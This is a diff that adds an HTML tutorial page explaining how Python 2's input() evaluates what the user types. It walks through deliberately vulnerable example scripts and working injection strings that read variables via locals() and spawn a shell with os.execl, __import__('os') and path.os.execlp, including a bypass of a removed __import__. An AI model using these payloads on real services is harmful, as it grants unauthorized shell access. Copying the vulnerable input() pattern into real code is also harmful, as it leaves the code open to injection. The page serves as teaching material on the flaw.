@@ -1,0 +1,188 @@
+<html>
+ <head>
+<title> Python-eval </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:1.8em;"> Eval exploit </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Python-Eval exploit </h1>
+   
+ <br> 
+
+<p> In Python, input(x) is equivalent to eval(raw_input(x)): it takes user input, and evaluates it as a Python expression </p>
+<br> <br>
+<p> Ok hey wait !!!! Before diving into exploit lets learn the some prerequisites .... <br>
+  Python uses what are called namespaces to keep track of variables. A namespace is just like a dictionary where the keys are names of variables and the dictionary values are the values of those variables. <br>
+  In fact, you can access a namespace as a Python dictionary, as you'll see in a minute. locals() and globals()  are bulitin functions which let us to access that dict <br><br>
+  Ok next __import__() it is too a builtin function which let us to import any module in runtime <br><br>
+  Another usefull module glob : glob.glob('*') would list all the files in that directory , glob.glob('.*') would result in all hidden files .
+  
+  </p>
+
+
+
+<h2> Part 1 </h2>
+
+<code># example1.py
+from random import randint
+num = randint(1,100)
+print "Guess the number! 1 to 100."
+while True:
+  guess = input('Your guess> ')
+  if guess != num:
+    print "Nope,", guess, "is wrong."
+  else:
+    print "You win!"
+    exit(0)</code>
+
+<p> So by just giving num as input it evaluates value in it and assigns to guess & that's it !!!</p>
+<code> $ python example1.py
+Guess the number! 1 to 100.
+Your guess> num
+You win!</code>
+<br>
+<h2> Part 2 </h2>
+
+<p> In part-1 we didn't find the num so to find it we can give 'print num' but it's not a valid expression it is a statment <br>
+if a py code  began with an “import sys”, we could enter <b>sys.stdout.write(str(num))</b> to get the value of num. <br>
+Else u can try str(num) to get o/p in error display<br>
+ 
+<h2> Part-3  </h2> 
+
+<p>Time to introduce a new tool: locals() and globals(). These built-in Python functions let you view and edit the local and global scope as dictionaries.</p>
+
+<code>$ python ./example1.py
+Guess the number! 1 to 100.
+Your guess> locals()
+Nope, {'guess': {...}, 'randint': <bound method Random.randint of
+ <random.Random object at 0x7faada071820>>, '__builtins__':
+ <module '__builtin__' (built-in)>, '__file__': './example1.py',
+ '__package__': None, 'num': 35, '__name__': '__main__',
+ '__doc__': None} is wrong.
+Your guess> 35
+You win!</code>
+
+<p>There's more sorts of introspection you can do in Python: vars, __dict__, func_globals and __subclasses__ come to mind. </p>
+
+<h2>Popping a shell</h2>
+<code># example2.py
+import os
+print "What files do you want?"
+files = input('list> ')
+for name in files:
+  if os.path.exists(name):
+    with open(name) as f:
+      print f.read()
+  else:
+    print name, "does not exist!" </code>
+
+<p>The os.system pretty much just takes a string an runs it as a shell command</p>
+
+<code>$ nc pyservice.example.com 1234
+What files do you want?
+list> os.execl('/bin/sh','sh')
+sh-3.2$ echo "I have a shell."
+I have a shell.
+sh-3.2$ exit</code>
+
+<h2>__import__</h2>
+
+<p>One last thing to know about: scripts aren't safe just because they don't have import os anywhere, because we can import os ourselves! Consider the following example</p>
+<code># example3.py
+print "What files do you want?"
+files = input('list> ')
+for name in files:
+  try:
+    with open(name) as f:
+      print f.read()
+  except:
+    print name, "does not exist!"</code>
+
+<code> $ python example3.py
+What files do you want?
+list> __import__('os').execl('/bin/sh','sh')
+sh-3.2$ echo 'I win again'
+I win again</code>
+
+<br><br>
+<h2> Task 3 </h2>
+<p> Ok some added protection by removing __import__ from bulitins </p>
+<br>
+<code>
+from os import path
+del __builtins__.__dict__['__import__']
+del __builtins__.__dict__['reload']
+...
+print_description(input('> '))
+</code>
+<br>
+<p>Ok fortunately the path package have os sub-module </p>
+<code>
+>>> from os import path
+>>> dir(path)
+['__all__', '__builtins__',...,'os']
+
+path.os.execlp('sh','sh')
+$
+</code>
+
+</body>
+</html>
